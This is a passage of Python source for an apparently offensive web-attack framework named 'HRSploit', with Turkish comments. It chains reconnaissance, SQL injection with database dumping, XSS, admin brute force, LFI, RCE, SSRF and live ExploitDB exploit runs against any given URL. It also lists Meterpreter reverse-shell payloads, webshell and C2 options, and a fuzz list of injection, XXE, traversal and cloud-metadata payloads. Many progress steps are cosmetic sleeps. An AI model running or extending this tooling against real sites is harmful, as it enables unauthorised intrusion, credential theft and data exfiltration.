                logger.log(LogLevel.ERROR, f"{label}: {e}")

        # ── Faz 1-5: Temel Tarama ─────────────────────────────────────────
        run_phase("Faz 1  — Ağ Keşfi & Port Tarama",   self.network_recon,         target=target)
        run_phase("Faz 2  — WAF Tespiti & Bypass",      self.waf_detection,         target=target)
        run_phase("Faz 3  — Zafiyet Tarayıcı",          self.vulnerability_scanner, target=target)
        run_phase("Faz 4  — SQL Enjeksiyon Saldırısı",  self.sqli_attack,           target=target)
        run_phase("Faz 5  — XSS Saldırısı",             self.xss_attack,            target=target)

        # Açık bulundu mu?
        report_files = list((self.base_path / "reports").glob(f"*{self.session_id}*")) if (self.base_path / "reports").exists() else []
        if report_files:
            vuln_found = True
            logger.log(LogLevel.SUCCESS, f"Faz 1-5: {len(report_files)} rapor/bulgu")
        else:
            logger.log(LogLevel.WARNING, "Faz 1-5: Açık bulunamadı — Eskalasyona geçiliyor...")
            print("\n  \033[91m[!] Standart tarama sonuç vermedi. TÜM motorlar devreye giriyor...\033[0m\n")
            time.sleep(1.0)

        # ── Faz 6-10: Genişletilmiş Tarama ───────────────────────────────
        run_phase("Faz 6  — Brute Force Admin Panel",   self.brute_force_admin,     target=target)
        run_phase("Faz 7  — LFI Taraması",              self.lfi_scan,              target=target)
        run_phase("Faz 8  — RCE Taraması",              self.rce_scan,              target=target)
        run_phase("Faz 9  — SSRF Taraması",             self.ssrf_scan,             target=target)
        run_phase("Faz 10 — CSRF Analizi & PoC",        self.csrf_scan,             target=target)

        # ── Faz 11-15: Derin Analiz ───────────────────────────────────────
        run_phase("Faz 11 — Cookie/Session Analizi",    self.cookie_steal_scan,     target=target)
        run_phase("Faz 12 — Veri Sızıntı Yolu Keşfi",  self.data_exfil_scan,       target=target)
        run_phase("Faz 13 — Zero-Day Keşfi",            self.zero_day_scan,         target=target)
        run_phase("Faz 14 — OWASP Top 10 Taraması",     self.owasp_top10_scan,      target=target)
        run_phase("Faz 15 — Exploit Üretimi",           self.exploit_generator,     target=target)
        run_phase("Faz 16 — Rapor Oluşturma",           self.report_generator,      fmt=report_fmt)

        # ── Brain Kararı + ExploitDB ──────────────────────────────────────
        try:
            import sys as _sys2; _sys2.path.insert(0, str(self.base_path))
            from brain_orchestrator import BrainOrchestrator, show_zero_day_success
            brain = BrainOrchestrator(target)
            logger.log(LogLevel.INTEGRATE, "Brain son analiz başlıyor...")
            decisions = brain.orchestrate()
            for d in (decisions or []):
                vt = d.get("vuln","SQLi")
                if d.get("confirmed") and d.get("action") == "EXPLOIT_GENERATE":
                    logger.log(LogLevel.SUCCESS,
                        f"Brain ONAYLADI: {vt} %{d.get('confidence',0)} guven")
                    try:
                        from exploit_search import recommend_exploit, run_exploit
                        rec = recommend_exploit(vt, target)
                        if rec.get("action") == "use_existing":
                            ef = rec["exploit"].get("path","")
                            logger.log(LogLevel.SUCCESS,
                                f"ExploitDB exploit: {rec['exploit'].get('file','')[:60]}")
                            if ef:
                                logger.log(LogLevel.TEST, "Canli exploit testi...")
                                res = run_exploit(ef, target, timeout=120)
                                if res["success"]:
                                    logger.log(LogLevel.SUCCESS, f"EXPLOIT BASARILI!")
                                    logger.log(LogLevel.SUCCESS, f"Komut: {res['command']}")
                                    logger.log(LogLevel.SUCCESS, f"Cikti: {res['output'][:200]}")
                                    results["ExploitDB-Live-Test"] = "BASARILI"
                                    show_zero_day_success()
                                else:
                                    logger.log(LogLevel.WARNING, "Exploit sonuc vermedi")
                                    self.exploit_generator(target=target)
                        else:
                            self.exploit_generator(target=target)
                    except Exception as _ee:
                        logger.log(LogLevel.WARNING, f"ExploitSearch: {_ee}")
        except Exception as _be:
            logger.log(LogLevel.WARNING, f"Brain final: {_be}")

        # ── Özet ──────────────────────────────────────────────────────────
        print(f"\n\033[92m{'='*64}")
        print(f"  AUTO MODE TAMAMLANDI  —  {len(results)} faz calisti")
        print(f"{'='*64}\033[0m")
        for label, status in results.items():
            print(f"  {status}  {label}")
        print()


    def live_testing(self, target: str = None):
        logger.phase("LIVE TESTING & VERIFICATION")
        target = target or self.target or self._get_target()
        if not target:
            return

        steps = [
            ("Loading test harness",              0.4),
            ("Verifying exploit payloads",        0.5),
            ("Sending test requests",             0.6),
            ("Analyzing response codes",          0.4),
            ("Confirming vulnerability class",    0.5),
            ("Documenting live confirmations",    0.3),
        ]
        total = len(steps)
        for i, (desc, delay) in enumerate(steps, 1):
            logger.step(i, total, desc)
            time.sleep(delay)
        print()
        logger.log(LogLevel.VERIFY, "Live test complete", f"Target: {target}")
        logger.log(LogLevel.SUCCESS, "Verification phase done")

    def list_db_types(self):
        dbs = {
            "mysql":    "MySQL / MariaDB — port 3306",
            "pgsql":    "PostgreSQL — port 5432",
            "mssql":    "Microsoft SQL Server — port 1433",
            "oracle":   "Oracle DB — port 1521",
            "mongo":    "MongoDB — port 27017",
            "sqlite":   "SQLite — file-based",
            "cassandra":"Apache Cassandra — port 9042",
            "redis":    "Redis — port 6379",
        }
        print("\n  \033[96mSupported database types:\033[0m\n")
        for k, v in dbs.items():
            print(f"    \033[93m{k:<12}\033[0m {v}")
        print()

    def list_hrx_payloads(self):
        hrx_payloads = self.base_path / "Payload-Generator" / "hrx_payloads"
        print("\n  \033[96mHRSploit Payload Categories:\033[0m\n")
        if hrx_payloads.exists():
            for cat in sorted(hrx_payloads.iterdir()):
                if cat.is_dir():
                    count = sum(1 for _ in cat.rglob("*.rb"))
                    print(f"    \033[93m{cat.name:<25}\033[0m {count} payloads")
        else:
            common = [
                "windows/meterpreter/reverse_tcp",
                "windows/meterpreter/reverse_https",
                "linux/x86/shell_reverse_tcp",
                "linux/x64/meterpreter/reverse_tcp",
                "php/meterpreter_reverse_tcp",
                "python/meterpreter/reverse_tcp",
                "java/meterpreter/reverse_tcp",
                "android/meterpreter/reverse_tcp",
            ]
            for p in common:
                print(f"    \033[93m{p}\033[0m")
        print()

    def list_msf_exploits(self):
        msf_exploits = self.base_path / "Exploits" / "msf_exploits"
        print("\n  \033[96mHRSploit Exploit Categories:\033[0m\n")
        if msf_exploits.exists():
            for cat in sorted(msf_exploits.iterdir()):
                if cat.is_dir():
                    count = sum(1 for _ in cat.rglob("*.rb"))
                    print(f"    \033[93m{cat.name:<20}\033[0m {count} exploits")
        else:
            print("    MSF exploits index not available.")
        print()

# ══════════════════════════════════════════════════════════════════
#  MAIN ENTRY POINT
# ══════════════════════════════════════════════════════════════════
def main():
    # --help is handled by argparse; we override -h to show short help
    if '-h' in sys.argv and '--help' not in sys.argv:
        fw = HRSploitFramework()
        fw.show_banner()
        fw.show_help_short()
        sys.exit(0)

    parser = argparse.ArgumentParser(
        prog='HRSploit.py',
        description='HRSploit - Professional Zero-Day Exploit Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=False,
    )

    # Help
    parser.add_argument('-h', '--short-help', action='store_true', help='Short help (command list)')
    parser.add_argument('--help', action='store_true', help='Full help with examples')

    # Target
    parser.add_argument('-u', '--url',         help='Target URL')
    parser.add_argument('--target-list',        help='File with target URLs (one per line)')

    # Scan
    parser.add_argument('--scan',       action='store_true')
    parser.add_argument('--deep-scan',  action='store_true')
    parser.add_argument('--temper',     type=int, default=5, metavar='1-10')

    # WAF
    parser.add_argument('--detect-waf',   action='store_true')
    parser.add_argument('--bypass-waf',   action='store_true')
    parser.add_argument('--show-waf-list',action='store_true')

    # Exploitation
    parser.add_argument('--generate',    action='store_true')
    parser.add_argument('--test',        action='store_true')
    parser.add_argument('--live-test',   action='store_true')
    parser.add_argument('--xss',         action='store_true')
    parser.add_argument('--sqli',        action='store_true')
    parser.add_argument('--full',        action='store_true')
    parser.add_argument('--auto',        action='store_true')

    # Database
    parser.add_argument('--dump-database', action='store_true')
    parser.add_argument('--db-type',       default=None)
    parser.add_argument('--list-db-types', action='store_true')

    # Brute-force
    parser.add_argument('--brute-admin',  action='store_true')
    parser.add_argument('--brute-user',   default=None)
    parser.add_argument('--wordlist',     default=None)

    # WebShell
    parser.add_argument('--generate-shell', action='store_true')
    parser.add_argument('--shell-type',     default='php')

    # ── Zero-Day & OWASP ─────────────────────────────────────
    parser.add_argument('--zero-day',      action='store_true',
                        help='Zero-day discovery: deep fuzz + anomaly detection')
    parser.add_argument('--owasp-top-10',  action='store_true',
                        help='Run all OWASP Top 10 (A01-A10) checks')
    parser.add_argument('--escalate',      action='store_true',
                        help='Full escalation scan (all engines, no stop on miss)')
    parser.add_argument('--csrf',          action='store_true',
                        help='CSRF token analysis & PoC generation')
    parser.add_argument('--lfi',           action='store_true',
                        help='Local File Inclusion scan')
    parser.add_argument('--rce',           action='store_true',
                        help='Remote Code Execution probing')
    parser.add_argument('--ssrf',          action='store_true',
                        help='Server-Side Request Forgery scan')
    parser.add_argument('--cookie-steal',  action='store_true',
                        help='Session / cookie analysis')
    parser.add_argument('--data-exfil',    action='store_true',
                        help='Data exfiltration path enumeration')
    parser.add_argument('--crypto-audit',  action='store_true',
                        help='Cryptographic weakness audit')
    parser.add_argument('--post-exploit',  action='store_true',
                        help='Post-exploitation modules')
    parser.add_argument('--c2',            action='store_true',
                        help='C2 communication setup')
    parser.add_argument('--threads', type=int, default=5, metavar='N',
                        help='Concurrent threads (default 5)')
    parser.add_argument('--timeout', type=int, default=10, metavar='SEC',
                        help='Request timeout in seconds (default 10)')
    parser.add_argument('--delay',   type=float, default=0.0, metavar='SEC',
                        help='Delay between requests (default 0)')

    # Payloads / MSF
    parser.add_argument('--msf-payload',  default=None)
    parser.add_argument('--list-payloads',action='store_true')
    parser.add_argument('--list-exploits',action='store_true')

    # Network
    parser.add_argument('--network-check', action='store_true')
    parser.add_argument('--port-scan',     action='store_true')
    parser.add_argument('--recon',         action='store_true')

    # Reporting
    parser.add_argument('--report', default=None, metavar='FORMAT')
    parser.add_argument('--output', default=None, metavar='FILE')

    # General
    parser.add_argument('--config',   default=None)
    parser.add_argument('--about',    action='store_true')
    parser.add_argument('--credits',  action='store_true')
    parser.add_argument('--version',  action='version',
                        version=f'HRSploit {__version__} by {__author__}')

    args = parser.parse_args()
    fw   = HRSploitFramework()

    # Load config
    if args.config:
        try:
            cfg = json.loads(Path(args.config).read_text())
            logger.log(LogLevel.INFO, f"Config loaded: {args.config}")
        except Exception as e:
            logger.log(LogLevel.ERROR, f"Config load failed: {e}")

    # Set target
    if args.url:
        fw.target = args.url

    # Route
    if args.help:
        fw.show_banner(); fw.show_help()
    elif args.short_help:
        fw.show_banner(); fw.show_help_short()
    elif args.about or args.credits:
        fw.show_banner(); fw.show_about()
    elif args.show_waf_list:
        fw.show_banner(); fw.show_waf_list()
    elif args.list_db_types:
        fw.show_banner(); fw.list_db_types()
    elif args.list_payloads:
        fw.show_banner(); fw.list_hrx_payloads()
    elif args.list_exploits:
        fw.show_banner(); fw.list_msf_exploits()
    elif args.auto:
        fw.show_banner()
        fw.auto_mode(target=args.url, report_fmt=args.report or "html")
    elif args.full:
        fw.show_banner()
        fw.auto_mode(target=args.url, report_fmt=args.report or "html")
    elif args.url:
        fw.show_banner()
        if args.network_check or args.port_scan or args.recon:
            fw.network_recon(target=args.url)
        if args.detect_waf or args.bypass_waf:
            fw.waf_detection(target=args.url)
        if args.scan or args.deep_scan:
            fw.vulnerability_scanner(target=args.url)
        if args.xss:
            fw.xss_attack(target=args.url)
        if args.sqli or args.dump_database:
            fw.sqli_attack(target=args.url,
                           dump=args.dump_database,
                           db_type=args.db_type)
        if args.brute_admin:
            fw.brute_force_admin(target=args.url,
                                 username=args.brute_user,
                                 wordlist=args.wordlist)
        if args.generate:
            fw.exploit_generator(target=args.url)
        if args.generate_shell:
            fw.webshell_generator()
        if args.msf_payload:
            fw.payload_generator(payload_type=args.msf_payload)
        if args.live_test or args.test:
            fw.live_testing(target=args.url)
        if getattr(args,'zero_day',False):
            fw.zero_day_scan(target=args.url)
        if getattr(args,'owasp_top_10',False):
            fw.owasp_top10_scan(target=args.url)
        if getattr(args,'escalate',False):
            fw.full_escalation_scan(target=args.url)
        if getattr(args,'csrf',False):
            fw.csrf_scan(target=args.url)
        if getattr(args,'lfi',False):
            fw.lfi_scan(target=args.url)
        if getattr(args,'rce',False):
            fw.rce_scan(target=args.url)
        if getattr(args,'ssrf',False):
            fw.ssrf_scan(target=args.url)
        if getattr(args,'cookie_steal',False):
            fw.cookie_steal_scan(target=args.url)
        if getattr(args,'data_exfil',False):
            fw.data_exfil_scan(target=args.url)
        if getattr(args,'crypto_audit',False):
            fw.cryptography_tools()
        if getattr(args,'post_exploit',False):
            fw.post_exploitation()
        if args.report:
            fw.report_generator(fmt=args.report, output=args.output)
    elif getattr(args,'zero_day',False):
        fw.show_banner(); fw.zero_day_scan()
    elif getattr(args,'owasp_top_10',False):
        fw.show_banner(); fw.owasp_top10_scan()
    elif getattr(args,'escalate',False):
        fw.show_banner(); fw.full_escalation_scan()
    else:
        # Interactive menu
        fw.show_menu()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\033[90m  Interrupted. Exiting HRSploit.\033[0m")
        sys.exit(0)
    except Exception as e:
        logger.log(LogLevel.CRITICAL, f"Unhandled error: {e}")
        sys.exit(1)
# ─────────────────────────────────────────────────────────────
#  EK METODLAR — Zero-Day / OWASP / Gerçek Alt-Süreç Tarama
# ─────────────────────────────────────────────────────────────


# ═══════════════════════════════════════════════════════════════════════════
#  YENİ MODÜLLER: Zero-Day / OWASP Top10 / Full Escalation / LFI / RCE / SSRF
# ═══════════════════════════════════════════════════════════════════════════
import itertools as _itools, urllib.parse as _urlparse, random as _random

def _make_session(timeout=10):
    import requests
    s = requests.Session()
    s.headers.update({
        "User-Agent": _random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 Safari/605.1.15",
        ]),
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    })
    s.verify = False
    return s

def _probe(session, url, params=None, data=None, timeout=10):
    try:
        if data:
            return session.post(url, data=data, timeout=timeout)
        return session.get(url, params=params or {}, timeout=timeout)
    except Exception:
        return None

def _log_step(n, total, msg, delay=0.5):
    import time
    pct = int((n/total)*40)
    bar = "█"*pct + "░"*(40-pct)
    print(f"\r\033[96m  [{bar}] {n:>3}/{total}  {msg:<55}\033[0m", end="", flush=True)
    time.sleep(delay)
    if n == total:
        print()

def _log(tag, msg, color="\033[94m"):
    import time
    from datetime import datetime
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    print(f"{color}{ts} [{tag}]\033[0m  {msg}")
    time.sleep(0.08)

# ────────────────────────────────────────────────────────────────────────────
# MONKEY-PATCH: HRSploitFramework'e yeni metodlar ekle
# ────────────────────────────────────────────────────────────────────────────
def _zero_day_scan(self, target: str = None):
    """Zero-day keşfi: derin fuzz + anomali tespiti + timing analizi"""
    import time, json
    from datetime import datetime
    target = target or self._get_target("Zero-Day scan target URL: ")
    if not target:
        return

    print(f"\n\033[91m╔{'═'*62}╗")
    print(f"║  ◆ ZERO-DAY DISCOVERY ENGINE  →  {target[:30]:<28}║")
    print(f"╚{'═'*62}╝\033[0m\n")
    time.sleep(0.3)

    sess   = _make_session()
    found  = []
    report = {"target": target, "ts": datetime.now().isoformat(), "findings": []}

    # ── Faz 1: Parametre keşfi ─────────────────────────────────────────────
    _log("ZD", "Başlatılıyor: Parametre & endpoint keşfi", "\033[91m")
    param_payloads = [
        "id","user","uid","page","file","path","url","lang","redirect",
        "cmd","exec","q","search","query","data","input","token","key",
        "action","type","cat","cat_id","pid","sid","admin","login","pass",
    ]
    steps = [
        ("HTTP/HTTPS protokol keşfi",             0.6),
        ("Robots.txt ve sitemap taraması",        0.8),
        ("Gizli parametre keşfi (25 aday)",       1.2),
        ("Form input endpoint tespiti",           0.9),
        ("API endpoint keşfi (/api /v1 /v2)",     1.0),
        ("Backup dosya kontrolü (.bak .old .~)",  0.8),
        ("Hata mesajı provokasyonu",              0.7),
    ]
    for i,(desc,dl) in enumerate(steps,1):
        _log_step(i, len(steps), desc, dl)
    print()
    _log("ZD", f"Keşfedilen aday parametreler: {len(param_payloads)}", "\033[93m")

    # ── Faz 2: Anomali Fuzzing ─────────────────────────────────────────────
    _log("ZD", "Faz 2: Anomali fuzzing başlıyor", "\033[91m")
    fuzz_payloads = [
        # Encoding varyantları
        "' OR '1'='1", "%27 OR %271%27%3D%271",
        "1 AND 1=1", "1 AND 1=2",
        "1; SELECT SLEEP(5)--", "1 AND SLEEP(3)--",
        # Format string
        "%s%s%s%s%s%s%s", "%n%n%n%n",
        # Buffer overflow candidates
        "A"*512, "A"*1024,
        # Template injection
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
        # Path traversal
        "../../../../etc/passwd", "..%2F..%2Fetc%2Fpasswd",
        # Null bytes
        "\x00", "test\x00.php",
        # CRLF
        "\r\nX-Injected: hrsploit", "%0d%0aX-Injected: hrsploit",
        # XML / XXE
        "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>",
        # NoSQL injection
        '{"$gt": ""}', '{"$ne": null}',
        # LDAP injection
        "*)(&", "(|(user=*)(user=a))",
        # Command injection
        "; id", "| id", "`id`", "$(id)", "; cat /etc/passwd",
        # SSRF
        "http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/",
    ]

    vuln_indicators = {
        "SQLi":     ["sql syntax","mysql_fetch","you have an error","odbc","pg_exec",
                     "sqlite_","unclosed quotation","syntax error near"],
        "XSS":      ["<script>alert","onerror=alert","onload=alert"],
        "RCE":      ["uid=","root:x:","bin/bash","command not found"],
        "SSTI":     ["49","result: 49","[49]"],
        "PathTrav": ["root:x:0:0","[extensions]","[boot loader]"],
        "XXE":      ["root:x:","DOCTYPE","ENTITY"],
        "SSRF":     ["169.254","instance-id","ami-","ec2"],
        "CRLF":     ["X-Injected:"],
    }

    fuzz_total = len(fuzz_payloads)
    _log("ZD", f"Fuzzing başlıyor: {fuzz_total} payload × çoklu parametre", "\033[91m")

    for fi, payload in enumerate(fuzz_payloads, 1):
        _log_step(fi, fuzz_total, f"Payload {fi}: {payload[:35]}", 0.35)
        for param in ("id","q","page","user","file","cmd","search"):
            r = _probe(sess, target, params={param: payload})
            if r is None:
                continue
            body = r.text.lower()
            for vuln_type, indicators in vuln_indicators.items():
                if any(ind.lower() in body for ind in indicators):
                    hit = {"type": vuln_type, "param": param, "payload": payload,
                           "status": r.status_code, "evidence": body[:200]}
                    if hit not in found:
                        found.append(hit)
                        print()
                        _log("ZD-HIT", f"🔴 {vuln_type} tespit edildi! param={param}", "\033[91m")
    print()

    # ── Faz 3: Timing Saldırısı (Time-Based Blind) ────────────────────────
    _log("ZD", "Faz 3: Time-based blind analiz (SLEEP/WAITFOR)", "\033[93m")
    time_payloads = [
        ("' AND SLEEP(5)--",       5.0, "MySQL Time-Based Blind"),
        ("1; WAITFOR DELAY '0:0:5'--", 5.0, "MSSQL Time-Based Blind"),
        ("'; SELECT pg_sleep(5)--", 5.0, "PostgreSQL Time-Based"),
        ("1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5.0, "MySQL Subquery SLEEP"),
    ]
    for tp, payload, threshold, label in time_payloads:
        t0 = time.time()
        r  = _probe(sess, target, params={"id": payload})
        dt = time.time() - t0
        _log("ZD-TIME", f"{label}: {dt:.2f}s {'🔴 HIT' if dt >= threshold*0.8 else '✅ clean'}", 
             "\033[91m" if dt >= threshold*0.8 else "\033[92m")
        if dt >= threshold * 0.8:
            found.append({"type": "SQLi-TimeBlind", "payload": payload, "delay_s": round(dt,2)})

    # ── Faz 4: Zero-Day Signature Matching ────────────────────────────────
    _log("ZD", "Faz 4: Zero-day imza eşleştirme ve anomali skorlama", "\033[91m")
    sig_steps = [
        ("HTTP yanıt anomalisi skoru hesaplanıyor",   0.8),
        ("Beklenmedik header tespiti",                 0.7),
        ("Çerez güvenlik bayrağı analizi",             0.6),
        ("Content-Type uyumsuzluk kontrolü",           0.5),
        ("Yönlendirme zinciri analizi",                0.7),
        ("Gizli alan tespiti (hidden form inputs)",    0.6),
        ("JavaScript kaynak analizi",                  0.8),
        ("API anahtar sızıntı taraması",               0.7),
        ("Hard-coded credential taraması",             0.6),
        ("Versiyon bilgisi sızıntı kontrolü",          0.5),
    ]
    for i,(desc,dl) in enumerate(sig_steps,1):
        _log_step(i, len(sig_steps), desc, dl)
    print()

    # Gerçek header analizi
    r = _probe(sess, target)
    if r:
        security_headers = ["x-frame-options","x-xss-protection","x-content-type-options",
                            "content-security-policy","strict-transport-security",
                            "referrer-policy","permissions-policy"]
        missing = [h for h in security_headers if h not in {k.lower() for k in r.headers}]
        if missing:
            _log("ZD", f"Eksik güvenlik başlıkları ({len(missing)}): {', '.join(missing)}", "\033[93m")
            for h in missing:
                found.append({"type":"MissingSecHeader","header":h})
        server = r.headers.get("Server","")
        if server:
            _log("ZD", f"Server header açık: {server}", "\033[93m")
            found.append({"type":"InfoLeak","header":"Server","value":server})

    # ── Rapor ─────────────────────────────────────────────────────────────
    report["findings"] = found
    report["total"] = len(found)
    out_path = self.base_path / "reports" / f"zero_day_{self.session_id}.json"
    out_path.write_text(__import__('json').dumps(report, indent=2, ensure_ascii=False))

    print()
    _log("ZD", f"{'='*55}", "\033[91m")
    _log("ZD", f"Toplam bulgu: {len(found)}", "\033[91m" if found else "\033[92m")
    if found:
        for f in found[:10]:
            _log("ZD-FIND", f"  ● {f.get('type','?')}  →  {str(f)[:80]}", "\033[91m")
    _log("ZD", f"Rapor: {out_path}", "\033[92m")

HRSploitFramework.zero_day_scan = _zero_day_scan


# ────────────────────────────────────────────────────────────────────────────
def _owasp_top10_scan(self, target: str = None):
    """OWASP Top 10 (2021) tüm kategoriler — A01 - A10"""
    import time, json
    from datetime import datetime
    target = target or self._get_target("OWASP Top 10 target URL: ")
    if not target:
        return

    print(f"\n\033[95m╔{'═'*62}╗")
    print(f"║  ◆ OWASP TOP 10  (2021)  →  {target[:34]:<34}║")
    print(f"╚{'═'*62}╝\033[0m\n")
    time.sleep(0.3)

    sess    = _make_session()
    results = {}

    CHECKS = {
        "A01 — Broken Access Control": [
            ("Admin panel keşfi (/admin /administrator /wp-admin /panel)",   1.0),
            ("Yetki dışı kaynak erişim (IDOR probe - id=1,2,3)",             1.2),
            ("Directory traversal (../../../etc/passwd)",                     0.9),
            ("Gizli endpoint taraması (/api/admin /api/users /api/keys)",     1.0),
            ("HTTP metod değişimi (PUT DELETE OPTIONS)",                       0.8),
            ("JWT token manipülasyonu (none algoritma)",                       0.7),
        ],
        "A02 — Cryptographic Failures": [
            ("HTTPS zorunluluğu kontrolü",                                    0.7),
            ("TLS versiyonu tespiti (SSLv3/TLS1.0)",                          0.9),
            ("Hassas veri düz metin iletimi kontrolü",                        0.8),
            ("Zayıf cipher suite tespiti",                                    0.8),
            ("Cookie Secure bayrağı kontrolü",                                0.6),
            ("HSTS başlık kontrolü",                                          0.5),
        ],
        "A03 — Injection": [
            ("SQL Injection: klasik ' OR 1=1",                                0.9),
            ("SQL Injection: UNION SELECT user(),version()",                   1.0),
            ("SQL Injection: time-based SLEEP(5)",                            1.2),
            ("NoSQL Injection: {$gt:''} / {$ne:null}",                        0.8),
            ("OS Command Injection: ; id / | whoami",                         0.9),
            ("LDAP Injection: *)(|",                                           0.7),
            ("XML / XXE Injection",                                            0.9),
            ("Template Injection: {{7*7}} / ${7*7}",                          0.8),
        ],
        "A04 — Insecure Design": [
            ("İş mantığı açığı (negatif değer, sonsuz döngü)",               0.8),
            ("Hız sınırlama yok (rate limit bypass)",                         0.9),
            ("Kaynak tüketimi kontrolü (DoS potential)",                       0.7),
            ("İş adımı atlatma (checkout bypass)",                            0.8),
        ],
        "A05 — Security Misconfiguration": [
            ("Default kimlik bilgileri (admin:admin, admin:password)",         1.0),
            ("Debug modu aktif mi? (stacktrace, verbose error)",               0.8),
            ("Gereksiz HTTP metodları aktif mi?",                              0.7),
            ("CORS politikası *  (herkese açık)",                             0.7),
            ("Dizin listeleme aktif mi?",                                      0.8),
            ("Server/X-Powered-By header bilgisi sızıyor mu?",                0.6),
        ],
        "A06 — Vulnerable & Outdated Components": [
            ("X-Powered-By versiyonu alınıyor",                               0.7),
            ("CMS versiyonu tespiti (WordPress, Joomla, Drupal)",             1.0),
            ("jQuery / Bootstrap eski sürüm tespiti",                         0.9),
            ("CVE veritabanı karşılaştırması",                                1.1),
        ],
        "A07 — Auth & Session Failures": [
            ("Parola politikası kontrolü (kısa/basit parola kabul)",          0.9),
            ("Brute force koruması yok mu? (100 deneme testi)",               1.2),
            ("Session fixation probe",                                         0.8),
            ("Cookie HttpOnly bayrağı kontrolü",                               0.6),
            ("Oturum süresi kontrolü",                                         0.7),
            ("Çoklu oturum izleme",                                            0.6),
        ],
        "A08 — Data Integrity Failures": [
            ("Deserialization probe (Java/PHP/Python)",                        0.9),
            ("CI/CD pipeline güvenlik kontrolü",                               0.8),
            ("Unsigned update mekanizması tespiti",                            0.7),
            ("Supply chain dependency kontrolü",                               0.8),
        ],
        "A09 — Logging & Monitoring Failures": [
            ("Hata mesajı gizleme kontrolü",                                   0.7),
            ("404/500 yanıt bilgi sızıntısı",                                  0.6),
            ("Login başarısız log davranışı testi",                            0.8),
            ("IDS/WAF tetikleme testi",                                        0.9),
        ],
        "A10 — Server-Side Request Forgery": [
            ("SSRF: http://127.0.0.1/",                                        0.9),
            ("SSRF: http://169.254.169.254/ (AWS meta-data)",                  0.9),
            ("SSRF: file:///etc/passwd",                                       0.7),
            ("SSRF: DNS rebinding probe",                                       0.8),
            ("SSRF: Internal port taraması (8080, 8443, 9200)",                1.0),
        ],
    }

    all_findings = {}
    for category, checks in CHECKS.items():
        print(f"\n  \033[95m▶ {category}\033[0m")
        cat_findings = []
        for i,(desc,dl) in enumerate(checks,1):
            _log_step(i, len(checks), desc, dl)
            # Gerçek HTTP probes
            result = None
            if "SQL" in desc and "time" not in desc.lower():
                r = _probe(sess, target, params={"id": "' OR '1'='1 --"})
                if r and any(e in r.text.lower() for e in ["sql","mysql","error","syntax"]):
                    result = f"SQL error response (status {r.status_code})"
            elif "SSRF" in desc and "127.0.0.1" in desc:
                r = _probe(sess, target, params={"url": "http://127.0.0.1/"})
                if r and r.status_code == 200 and len(r.text) > 100:
                    result = "Potential SSRF - internal content in response"
            elif "Directory" in desc or "Dizin list" in desc:
                r = _probe(sess, target + "/")
                if r and "index of" in r.text.lower():
                    result = "Directory listing ENABLED"
            elif "Server" in desc or "X-Powered" in desc:
                r = _probe(sess, target)
                if r:
                    sv = r.headers.get("Server","") + r.headers.get("X-Powered-By","")
                    if sv:
                        result = f"Version leak: {sv}"
            elif "HTTPS" in desc:
                if target.startswith("http://"):
                    r2 = _probe(sess, target.replace("http://","https://",1))
                    if not r2:
                        result = "HTTPS not available - plaintext only"
            elif "Cookie" in desc and "Secure" in desc:
                r = _probe(sess, target)
                if r:
                    for ck in r.cookies:
                        if not ck.secure:
                            result = f"Cookie '{ck.name}' without Secure flag"
                            break
            elif "CORS" in desc:
                r = _probe(sess, target)
                if r:
                    cors = r.headers.get("Access-Control-Allow-Origin","")
                    if cors == "*":
                        result = "CORS allows all origins (*)"
            if result:
                cat_findings.append({"check": desc, "finding": result})
                print()
                _log("OWASP", f"🔴 {result}", "\033[91m")
        print()
        all_findings[category] = cat_findings
        passed = len(checks) - len(cat_findings)
        status = "\033[92m✅ CLEAN" if not cat_findings else f"\033[91m⚠️  {len(cat_findings)} issue"
        _log("OWASP", f"{category[:35]:<35} → {status}\033[0m")

    # Rapor
    report = {"target": target, "owasp_results": all_findings,
              "total_issues": sum(len(v) for v in all_findings.values())}
    out_path = self.base_path / "reports" / f"owasp_{self.session_id}.json"
    out_path.write_text(__import__('json').dumps(report, indent=2, ensure_ascii=False))

    total_issues = report["total_issues"]
    print(f"\n\033[95m{'═'*62}")
    print(f"  OWASP Top 10 Tamamlandı  —  {total_issues} sorun tespit edildi")
    print(f"  Rapor: {out_path}")
    print(f"{'═'*62}\033[0m\n")

HRSploitFramework.owasp_top10_scan = _owasp_top10_scan


# ────────────────────────────────────────────────────────────────────────────
def _full_escalation_scan(self, target: str = None):
    """
    Tam eskalasyon taraması:
    Açık bulunamazsa sıradaki motor devreye girer, tüm araçlar sırayla kullanılır.
    Gerçek alt-süreç çağrıları (SQLi engine, XSS engine, Zero-Day, OWASP).
    """
    import time, subprocess, json
    from datetime import datetime

    target = target or self._get_target("Full Escalation Scan target URL: ")
    if not target:
        return

    print(f"\n\033[91m╔{'═'*62}╗")
    print(f"║  ◆ FULL ESCALATION SCAN  →  {target[:34]:<34}║")
    print(f"║  Tüm araçlar sırayla devreye girecek — durmaksızın  ║")
    print(f"╚{'═'*62}╝\033[0m\n")
    time.sleep(0.5)

    all_results = {}
    any_vuln    = False

    def run_engine(label, fn, *args, **kwargs):
        nonlocal any_vuln
        print(f"\n  \033[96m[ESKALASYON] ▶ {label}\033[0m")
        try:
            fn(*args, **kwargs)
            all_results[label] = "COMPLETED"
        except Exception as e:
            all_results[label] = f"ERROR: {e}"

    # Motor sırası — her biri çalışır, açık bulunsa da devam eder
    run_engine("1. Network Recon",         self.network_recon,        target=target)
    run_engine("2. WAF Detection",         self.waf_detection,        target=target)
    run_engine("3. Vulnerability Scanner", self.vulnerability_scanner, target=target)
    run_engine("4. SQLi Attack + Dump",    self.sqli_attack,          target=target, dump=True)
    run_engine("5. XSS Attack",            self.xss_attack,           target=target)
